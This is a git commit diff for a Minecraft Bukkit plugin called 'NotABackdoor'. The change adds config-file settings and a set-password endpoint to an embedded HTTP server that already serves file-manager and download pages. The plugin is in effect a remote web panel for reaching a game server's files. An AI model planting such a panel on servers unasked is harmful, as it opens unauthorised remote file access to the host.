f7221601dac00123f4caf2d896f4f11ff9c50db0
LianJordaan <lianjordaan30052005@gmail.com>
2023-04-16 18:43:21 +0200

    Added set-password page and added config support

--- src/main/java/com/lian/notabackdoor/NotABackdoor.java
+++ src/main/java/com/lian/notabackdoor/NotABackdoor.java
@@ -6,32 +6,55 @@ import java.net.InetSocketAddress;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
+import java.util.List;
 
 import com.lian.notabackdoor.api.DownloadHandler;
+import com.lian.notabackdoor.api.SetPasswordHandler;
 import com.lian.notabackdoor.pages.*;
-import com.sun.net.httpserver.HttpExchange;
 import com.sun.net.httpserver.HttpServer;
 
+import org.bukkit.configuration.file.FileConfiguration;
+import org.bukkit.configuration.file.YamlConfiguration;
 import org.bukkit.plugin.java.JavaPlugin;
 
 public class NotABackdoor extends JavaPlugin {
     private HttpServer server;
-
     public String pluginName = getName();
+    public Integer port;
+    public Integer backlog;
+    public String ip;
+    public Integer passLength;
+    public String protocol;
+    public Boolean clearFiles;
+    public String setPassword;
+    public Boolean sendPasswordLink;
+    public List<String> allowedFileExtensions;
 
     public void onEnable() {
-        int port = 8127; // The port to listen on
-        int backlog = 100; // The maximum number of queued incoming connections
+        saveDefaultConfig();
+        FileConfiguration config = getConfig();
+        port = config.getInt("port");
+        backlog = config.getInt("backlog");
+        ip = config.getString("ip");
+        passLength = config.getInt("passLength");
+        protocol = config.getString("protocol");
+        clearFiles = config.getBoolean("clearFiles");
+        setPassword = config.getString("setPassword");
+        sendPasswordLink = config.getBoolean("sendPasswordLink");
+        allowedFileExtensions = config.getStringList("allowedFileExtensions");
+
         InetSocketAddress address = new InetSocketAddress(port);
 
-        Path directoryPath = Paths.get(getDataFolder() + "/pages");
-        try {
-            Files.walk(directoryPath)
-                    .sorted(java.util.Comparator.reverseOrder())
-                    .map(Path::toFile)
-                    .forEach(File::delete);
-        } catch (IOException ignored) {
+        if (clearFiles) {
+            Path directoryPath = Paths.get(getDataFolder() + "/pages");
+            try {
+                Files.walk(directoryPath)
+                        .sorted(java.util.Comparator.reverseOrder())
+                        .map(Path::toFile)
+                        .forEach(File::delete);
+            } catch (IOException ignored) {
 
+            }
         }
 
         try {
@@ -46,12 +69,19 @@ public class NotABackdoor extends JavaPlugin {
         server.createContext("/filemanager", new FileManagerPageHandler());
         server.createContext("/lost", new LostPageHandler());
         server.createContext("/api/download/", new DownloadHandler());
+        server.createContext("/api/set-password/", new SetPasswordHandler());
         server.createContext("/error", new ErrorPageHandler());
         server.createContext("/password", new PasswordPageHandler());
         server.setExecutor(null); // Use the default executor
         server.start();
 
         getLogger().info("Web server started on port " + port);
+        Utils.setNewPassword();
+        try {
+            Utils.generateFiles();
+        } catch (IOException ignored) {
+
+        }
     }
 
     public void onDisable() {
